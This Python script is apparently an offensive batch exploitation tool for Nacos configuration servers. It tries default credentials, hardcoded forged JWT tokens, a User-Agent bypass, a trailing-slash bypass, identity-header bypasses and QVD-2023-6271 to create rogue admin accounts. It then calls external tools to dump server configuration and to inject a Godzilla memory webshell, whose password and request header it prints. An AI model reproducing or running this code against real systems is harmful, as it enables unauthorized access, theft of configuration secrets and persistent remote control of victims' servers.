# -*- coding: utf-8 -*-

import os, random, re, subprocess, string, argparse, requests,urllib3
from urllib.parse import urlparse

urllib3.disable_warnings()

HEADERS = {
    "sec-ch-ua": "\"Not:A-Brand\";v=\"99\", \"Chromium\";v=\"112\"",
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/x-www-form-urlencoded", "sec-ch-ua-mobile": "?0",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5612.138 Safari/517.26",
    "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "zh-CN,zh;q=0.9"
    }

# 解析URL并保存到列表中
Parsed_Urls = []
FLAG = 0

class HKEcho_Nacos_Check:
    global FLAG
    def __init__(self, url) -> None:
        global FLAG
        self.baseurl = url
        self.username = "nacos" + str("".join(random.sample(string.digits, random.randint(3, 8))))
        self.password = "n@c0s936"
    def run(self):
        global FLAG
        FLAG = 0
        resule_file = '_'.join(self.baseurl.replace(':','.').split('/')[2].split('.'))
        if os.path.exists('./results/%s'%resule_file):
            print("\033[32m【+】本地results目录已有结果数据：%s\033[0m"%self.baseurl)
        else:
            self.unauth_view_user_list()
            if FLAG == 0:
                self.check_default_pass()
                if FLAG == 0 :
                    self.any_user_added()
                    if FLAG == 0 :
                        self.user_agent_bypass()
                        if FLAG == 0 :
                            self.user_url_bypass()
                            if FLAG == 0 :
                                self.default_JWT_for_user_add()
                                if FLAG == 0 :
                                    self.secret_jwt_bypass()
                                    if FLAG == 0 :
                                        self.identity_bypass()
                                        if FLAG == 0 :
                                            self.QVD_2023_6271()
    # # 校验用户是否添加成功
    # def check_user(self, user, pwd):
    #     if self.baseurl.endswith("/"):
    #         path = "nacos/v1/auth/users"
    #     else:
    #         path = "/nacos/v1/auth/users"
    #     data = {
    #         "username": user,
    #         "password": pwd
    #     }
    #     if user == "nacos" and pwd == "nacos":
    #         check_user = requests.post(url=self.baseurl+path,headers=HEADERS,data=data,verify=False)
    #         if check_user.status_code == 200:
    #             return True
    #     else:
    #         check_user = requests.post(url=self.baseurl+path,headers=HEADERS,data=data,verify=False)
    #         if "already exist!" in check_user.text:
    #             return True

    # 检查未授权查看用户列表
    def unauth_view_user_list(self):
        print("\033[1;35m【-】正在检测Nacos未授权查看用户列表......\033[0m")
        if self.baseurl.endswith("/"):
            path = "nacos/v1/auth/users?pageNo=1&pageSize=5"
        else:
            path = "/nacos/v1/auth/users?pageNo=1&pageSize=5"
        check_unauth_view_user_list = requests.get(url=self.baseurl+path,headers=HEADERS,verify=False)
        if "username" in check_unauth_view_user_list.text:
            print(f"\033[32m【+】目标存在Nacos未授权查看用户列表漏洞: 访问 {self.baseurl+path} 查看详细信息\033[0m")
        else:
            print("\033[31m【-】目标不存在Nacos未授权查看用户列表漏洞\033[0m")

    #检查默认账号密码
    def check_default_pass(self):
        global FLAG
        print("\033[1;35m【-】正在检测nacos默认口令......\033[0m")
        if self.baseurl.endswith("/"):
            path = "nacos/v1/auth/users/login"
        else:
            path = "/nacos/v1/auth/users/login"
        data = {
            "username": "nacos",
            "password": "nacos"
        }
        check_default_pass = requests.post(url=self.baseurl+path,headers=HEADERS,data=data,verify=False)
        # if "accessToken" in resp.text:
        if check_default_pass.status_code == 200:
            print("\033[32m【+】目标存在nacos默认口令: nacos/nacos\033[0m")
            username = "nacos"
            password = "nacos"
            FLAG = 1
            self.out_web_config(username,password)
        else:
            print("\033[31m【-】目标不存在nacos默认口令\033[0m")

    # 检查任意用户添加漏洞
    def any_user_added(self):
        global FLAG
        print("\033[1;35m【-】正在检测任意用户添加漏洞......\033[0m")
        if self.baseurl.endswith("/"):
            path = "nacos/v1/auth/users"
        else:
            path = "/nacos/v1/auth/users"
        data = {
            "username": self.username,
            "password": self.password
        }
        check_any_user_added = requests.post(url=self.baseurl+path, headers=HEADERS, data=data, verify=False).text
        if "already exist!" in check_any_user_added:
            print("\033[4;33m【+】目标存在任意用户添加漏洞: 用户:%s 已经存在，密码为：%s\033[0m"%(self.username,self.password))
        elif "create user ok" in check_any_user_added:
            print("\033[32m【+】目标存在任意用户添加漏洞: 用户:%s 添加成功，密码为：%s\033[0m"%(self.username,self.password))
            FLAG  = 1
            self.out_web_config(self.username,self.password)
        else:
            print("\033[31m【-】目标不存在任意用户添加漏洞\033[0m")

    # UA绕过
    def user_agent_bypass(self):
        global FLAG
        print("\033[1;35m【-】正在检测任意用户添加UA_Bypass漏洞......\033[0m")
        if self.baseurl.endswith("/"):
            path = "nacos/v1/auth/users"
        else:
            path = "/nacos/v1/auth/users"
        url = self.baseurl+path
        data = {
            "username": self.username,
            "password": self.password
        }
        UA = {"User-Agent": "Nacos-Server" + HEADERS["User-Agent"]}
        new_headers = {**HEADERS, **UA}  # 区分大小写
        check_user_agent_bypass = requests.post(url, headers=new_headers, data=data, verify=False).text
        if "already exist!" in check_user_agent_bypass:
            print("\033[4;33m【+】目标存在任意用户添加UA_Bypass漏洞: 用户:%s 已经存在，密码为：%s\033[0m"%(self.username,self.password))
        elif "create user ok" in check_user_agent_bypass:
            print("\033[32m【+】目标存在任意用户添加UA_Bypass漏洞: 用户:%s 添加成功，密码为：%s\033[0m"%(self.username,self.password))
            FLAG = 1
            self.out_web_config(self.username,self.password)
        else:
            print("\033[31m【-】目标不存在任意用户添加UA_Bypass漏洞\033[0m")

    # url 末尾斜杠绕过
    def user_url_bypass(self):
        global FLAG
        print("\033[1;35m【-】正在检测任意用户添加末尾斜杠绕过漏洞......\033[0m")
        if self.baseurl.endswith("/"):
            path = "nacos/v1/auth/users/"
        else:
            path = "/nacos/v1/auth/users/"
        url = self.baseurl+path
        data = {
            "username": self.username,
            "password": self.password
        }
        check_user_url_bypass = requests.post(url, headers=HEADERS, data=data, verify=False).text
        if "already exist!" in check_user_url_bypass:
            print("\033[4;33m【+】目标存在任意用户添加末尾斜杠绕过漏洞: 用户:%s 已经存在，密码为：%s\033[0m"%(self.username,self.password))
        elif "create user ok" in check_user_url_bypass:
            print("\033[32m【+】目标存在任意用户添加末尾斜杠绕过漏洞: 用户:%s 添加成功，密码为：%s\033[0m"%(self.username,self.password))
            FLAG = 1
            self.out_web_config(self.username,self.password)
        else:
            print("\033[31m【-】目标不存在任意用户添加末尾斜杠绕过漏洞\033[0m")

    # 默认JWT任意用户添加
    def default_JWT_for_user_add(self):
        global FLAG
        print("\033[1;35m【-】正在检测默认JWT任意用户添加漏洞......\033[0m")
        if self.baseurl.endswith("/"):
            path = "nacos/v1/auth/users?accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3OTA4NTg3NX0.WT8N_acMlow8KTHusMacfvr84W4osgSdtyHu9p49tvc"
        else:
            path = "/nacos/v1/auth/users?accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3OTA4NTg3NX0.WT8N_acMlow8KTHusMacfvr84W4osgSdtyHu9p49tvc"

        data = {
            "username": self.username,
            "password": self.password
        }
        check_default_JWT_for_user_add = requests.post(url=self.baseurl+path, headers=HEADERS, data=data, verify=False).text
        if "already exist!" in check_default_JWT_for_user_add:
            print("\033[4;33m【+】目标存在默认JWT任意用户添加漏洞: 用户:%s 已经存在，密码为：%s\033[0m"%(self.username,self.password))
        elif "create user ok" in check_default_JWT_for_user_add:
            print("\033[32m【+】目标存在默认JWT任意用户添加漏洞: 用户:%s 添加成功，密码为：%s\033[0m"%(self.username,self.password))
            FLAG = 1
            self.out_web_config(self.username,self.password)
        else:
            print("\033[31m【-】目标不存在默认JWT任意用户添加漏洞\033[0m")


    # jwt secret key 硬编码绕过
    def secret_jwt_bypass(self):
        global FLAG
        print("\033[1;35m【-】正在检测JWT_Secret_Key硬编码绕过漏洞......\033[0m")
        if self.baseurl.endswith("/"):
            path = "nacos/v1/auth/users"
        else:
            path = "/nacos/v1/auth/users"
        url = self.baseurl+path
        jwts = [
            "eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6IjI2MTYyMzkwMjIifQ.5aXePQdHbh9hKNoj_qqCC4x6PzbXmpy-vYQHhi0PdjVHyDJ40Ge6CVz6AWuV1UHa4H8-A-LXMOqQGSXjrsJ8HQ",

            "eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OX0._GhyhPBLXfGVgWIAGnNT7z9mPL6-SPDAKorJ8eA1E3ZjnCPVkJYHq7OWGCm9knnDloJ7_mKDmSlHtUgNXKkkKw",

            "eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJuYWNvcyIsImlhdCI6MjYxNjIzOTAyMn0.jHIPHGlyaC7qKAGj0G6Kgb1WmrIpHosCnP8cHC24zceHpbyD7cmYuLc9r1oj3J6oFGr3KMnuKJlvTy8dopwNvw",

            "eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6Im5hY29zIiwiaWF0IjoyNjE2MjM5MDIyfQ.BEtiFKLAleuBCeakAoC6na-Lr8mfOUYUUm3nxaM0v3L5NeLk7UGZTDXCJQRguQDgU2HYE1VK9ETDIB-qjgqVnw",

        ]
        for jwt in jwts:
            print(f"\033[1;35m【-】Checking jwt: '{jwt}'\033[0m")
            data = {
                "username": self.username,
                "password": self.password,
                "accessToken": jwt
            }
            check_secret_jwt_bypass = requests.post(url, headers=HEADERS, data=data, verify=False).text
            if "already exist!" in check_secret_jwt_bypass:
                print("\033[4;33m【+】目标存在JWT_Secret_Key硬编码绕过漏洞: 用户:%s 已经存在，密码为：%s\033[0m"%(self.username,self.password))
            elif "create user ok" in check_secret_jwt_bypass:
                print("\033[32m【+】目标存在JWT_Secret_Key硬编码绕过漏洞: 用户:%s 添加成功，密码为：%s\033[0m"%(self.username,self.password))
                FLAG = 1
                self.out_web_config(self.username,self.password)
            else:
                print("\033[31m【-】目标不存在JWT_Secret_Key硬编码绕过漏洞\033[0m")

    # 开启授权后identity硬编码绕过
    def identity_bypass(self):
        global FLAG
        print("\033[1;35m【-】正在检测Identity硬编码绕过漏洞......\033[0m")
        if self.baseurl.endswith("/"):
            path = "nacos/v1/auth/users"
        else:
            path = "/nacos/v1/auth/users"
        url = self.baseurl+path
        identities = [
            {"serverIdentity": "security"},  # nacos < 2.2.1 默认
            {"test": "test"},
            {"example": "example"},
            {"authKey": "nacosSecurty"},
        ]
        data = {
            "username": self.username,
            "password": self.password
        }
        for identity in identities:
            key = list(identity.keys())[0]
            value = identity.get(key)
            print(f"\033[1;35m【-】Checking Identity_key_value: '{key}: {value}'\033[0m")
            new_headers = {**HEADERS, **identity}
            check_check_identity_bypass = requests.post(url, headers=new_headers, data=data, verify=False).text
            if "already exist!" in check_check_identity_bypass:
                print("\033[4;33m【+】目标存在Identity硬编码绕过: 用户:%s 已经存在，密码为：%s\033[0m"%(self.username,self.password))
            elif "create user ok" in check_check_identity_bypass:
                print("\033[32m【+】目标存在Identity硬编码绕过: 用户:%s 添加成功，密码为：%s\033[0m"%(self.username,self.password))
                FLAG = 1
                self.out_web_config(self.username,self.password)
            else:
                print("\033[31m【-】目标不存在Identity硬编码绕过漏洞\033[0m")

    # Nacos身份认证绕过批量检测（QVD-2023-6271)
    def QVD_2023_6271(self):
        global FLAG
        print("\033[1;35m【-】正在检测QVD-2023-6271身份认证绕过漏洞......\033[0m")
        if self.baseurl.endswith("/"):
            path = "nacos/v1/auth/users"
        else:
            path = "/nacos/v1/auth/users"
        url = self.baseurl+path
        headers = {
            "User-Agent": "Nacos-Server",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Authorization": "Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTYxODEyMzY5N30.nyooAL4OMdiByXocu8kL1ooXd1IeKj6wQZwIH8nmcNA",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "close",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Pragma": "no-cache",
            "Cache-Control": "no-cache",
        }
        data = {
            "username": self.username,
            "password": self.password
        }
        check_QVD_2023_6271 = requests.post(url=url, headers=headers, data=data,verify=False)
        if "already exist!" in check_QVD_2023_6271.text:
            print("\033[4;33m【+】目标存在QVD-2023-6271身份认证绕过漏洞: 用户:%s 已经存在，密码为：%s\033[0m"%(self.username,self.password))
        elif check_QVD_2023_6271.status_code == 200 and check_QVD_2023_6271.content.find(b"ok") != -1:
            print("\033[32m【+】目标存在QVD-2023-6271身份认证绕过漏洞: 用户:%s 添加成功，密码为：%s\033[0m"%(self.username,self.password))
            FLAG = 1
            self.out_web_config(self.username,self.password)
        else:
            print("\033[31m【-】目标不存在QVD-2023-6271身份认证绕过漏洞\033[0m")


    def out_web_config(self,username,password):
        # nacosleak.exe -t http://192.200.200.19:8848 -u nacos36014 -p n@c0s936
        if os.path.exists('./nacosleak.exe'):
            # 运行一个外部命令并获取其输出
            process = subprocess.Popen(['nacosleak.exe', '-t', '%s'%self.baseurl, '-u', '%s'%username, '-p', '%s'%password], stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            output, error = process.communicate()
            if "SUCCESS" in str(output.decode()) or "SUCCESS" in str(error.decode()):
                resule_file = '_'.join(self.baseurl.replace(':','.').split('/')[2].split('.'))
                result_path = os.getcwd() +"\\results\\" + resule_file + "\\public\\"
                print("\033[32m【+】配置文件结果已保存目录：%s\033[0m"%result_path)

    def Nacos_Jraft_Hessian(self):
        # java -jar NacosRce.jar http://192.200.200.19:8848/nacos 7848 memshell
        if os.path.exists('./NacosRce/NacosRce.jar'):
            if self.baseurl.endswith("/"):
                path = "nacos"
            else:
                path = "/nacos"
            url = self.baseurl+path
            # 运行一个外部命令并获取其输出
            process = subprocess.Popen(['java', '-jar', './NacosRce/NacosRce.jar','%s'%url, '7848', 'memshell'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            output, error = process.communicate()
            if "无需再次注入" in str(error.decode('gbk')) or "注入成功" in str(error.decode('gbk')) or "无需再次注入" in str(output.decode('gbk')) or "注入成功" in str(output.decode('gbk')):       #这里不用GBK对返回字节码处理会编码报错
                print("\033[32m【+】Nacos Hessian反序列化漏洞利用成功,请配合哥斯拉插件postnacos食用: %s\033[0m"%url)
            else:
                print("\033[31m【-】目标不存在Nacos Hessian反序列化漏洞\033[0m")

def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", dest='url', required=False, help='要检查漏洞的单个URL:http://127.0.0.1:8848')
    parser.add_argument("-f", dest='filename', required=False, help='批量检测,包含URL的文本文件')
    parser.set_defaults(show_help=False)
    args = parser.parse_args() #解析方法
    return args

def read_urls_from_file(filename):
    # 读取文本文件
    with open(filename, 'r') as f:
        content = f.read()
    # 匹配所有URL
    urls = re.findall(r'(https?://\S+)', content)
    for url in urls:
        parsed_url = urlparse(url)
        # 检查URL是否以'\'结尾，如果是则去掉
        if parsed_url.path.endswith('/'):
            parsed_url = parsed_url._replace(path=parsed_url.path[:-1])
        Parsed_Urls.append(parsed_url.geturl())
    return Parsed_Urls

def title():
    print("\033[4;36m* \033[0m" * 24)
    print("\t\033[35m~~||HKEcho Nacos快速利用工具||~~\033[0m")
    print("\t\t\033[33m【*】Author：HKEcho\033[0m\n")
    print("<*哥斯拉内存马*>")
    print("密码:pass/key")
    print("设置请求头:x-client-data:godzilla;")
    print("设置Referer:https://www.google.com/")
    print("\033[4;36m* \033[0m" * 24)

if __name__ == '__main__':
    title()
    args = parse_args()
    pro = subprocess.Popen(["java", "-version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    out, err = pro.communicate()
    if "java" in str(err.decode('gbk')) or "java" in str(out.decode('gbk')) :
        pass
    else:
        print("\033[37m【-】检测到系统未安装Java环境或配置错误,无法检测Nacos Hessian反序列化漏洞\033[0m")
    if args.url:
        try:
            T_F_alive = requests.get(url=args.url,headers=HEADERS,verify=False)
            if requests.get(url=args.url,headers=HEADERS,verify=False).status_code == 404 or requests.get(url=args.url + '/nacos/',headers=HEADERS,verify=False).status_code == 200:
                print("\033[1;35m【-】正在检测目标:\033[0m %s ......"%args.url)
                HKEcho_check = HKEcho_Nacos_Check(args.url)
                HKEcho_check.run()
                if "java" in str(err.decode('gbk')) :
                    HKEcho_check.Nacos_Jraft_Hessian()
        except Exception as err:
            print("\033[31m【-】访问失败:\033[31m %s"%args.url)
    elif args.filename:
        parsed_urls = read_urls_from_file(args.filename)
        for url in parsed_urls:
            try:
                T_F_alive = requests.get(url=url,headers=HEADERS,verify=False)
                if requests.get(url=url,headers=HEADERS,verify=False).status_code == 404 or requests.get(url=url + '/nacos/',headers=HEADERS,verify=False).status_code == 200:
                    print("\033[1;35m【-】正在检测目标:\033[0m %s ......"%url)
                    HKEcho_check = HKEcho_Nacos_Check(url)
                    HKEcho_check.run()
                    # if "java" in str(err.decode('gbk')) :
                    HKEcho_check.Nacos_Jraft_Hessian()
            except Exception as err:
                print("\033[31m【-】访问失败:\033[31m %s"%url)
